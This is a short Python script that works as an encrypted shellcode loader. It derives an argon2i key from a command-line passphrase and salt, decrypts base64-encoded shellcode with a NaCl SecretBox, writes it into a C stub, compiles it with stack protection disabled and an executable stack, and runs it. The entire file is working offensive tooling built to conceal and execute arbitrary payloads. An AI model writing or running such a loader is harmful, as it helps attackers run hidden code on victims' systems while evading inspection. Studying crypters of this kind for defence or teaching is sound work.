#!/usr/bin/env python3

import os
import sys
import base64
import nacl.secret
import nacl.utils
import nacl.pwhash
from ctypes import *


def generate_sym_key(passphrase, salt):

    # Key Derivation Function
    kdf = nacl.pwhash.argon2i.kdf

    try:
        # Symmetric key generation
        key = kdf(nacl.secret.SecretBox.KEY_SIZE, passphrase, salt)
    except Exception as ex:
        print('[!] ERROR. An exception occurred while generating the symmetric key')
        print(ex)
        sys.exit(1) 

    # Convert the key to hex
    hexed_key = key.hex()

    return hexed_key


def decrypt(enc_shellcode, key):

    # SecretBox for encrpytion (and decryption)
    box = nacl.secret.SecretBox(bytes.fromhex(key))

    try:
        # Base64 decode the encrypted shellcode before decryption
        shellcode = base64.b64decode(enc_shellcode)

        # Decryption
        plain_shellcode = box.decrypt(shellcode)

    except Exception as ex:
        print('[!] ERROR. An exception occurred during decryption')
        print(ex)
        sys.exit(1) 

    plain = plain_shellcode.decode('utf-8')

    return plain

    
def exec_shellcode(plaintext):
    # shellcode = bytes.fromhex(plaintext)
    shellcode_str = ''.join(['\\x%02x' % b for b in bytearray.fromhex(plaintext)])
    shellfile = open('shellcode.c', 'w')
    shellfile.write('unsigned char code[] = "')

    shellfile.close()
    shellfile = open('shellcode.c', 'a')
    shellfile.write(shellcode_str)
    shellfile.close()
    shellfile = open('shellcode.c', 'a')
    shellfile.write('''";

main() {
    int (*ret)() = (int(*)())code;
    ret();

}''')

    shellfile.close()
    os.system('gcc -fno-stack-protector -z execstack shellcode.c -o shellcode 2>/dev/null && ./shellcode')


if __name__ == '__main__':
    salt_b64, passphrase_b64, enc_shellcode_b64 = sys.argv[1].split('.')

    salt = base64.b64decode(salt_b64.encode())
    passphrase = base64.b64decode(passphrase_b64.encode())
    
    key = generate_sym_key(passphrase, salt)
    plain_shellcode = decrypt(enc_shellcode_b64, key)
    print('[*] Executing decrypted shellcode ...')
    exec_shellcode(plain_shellcode)
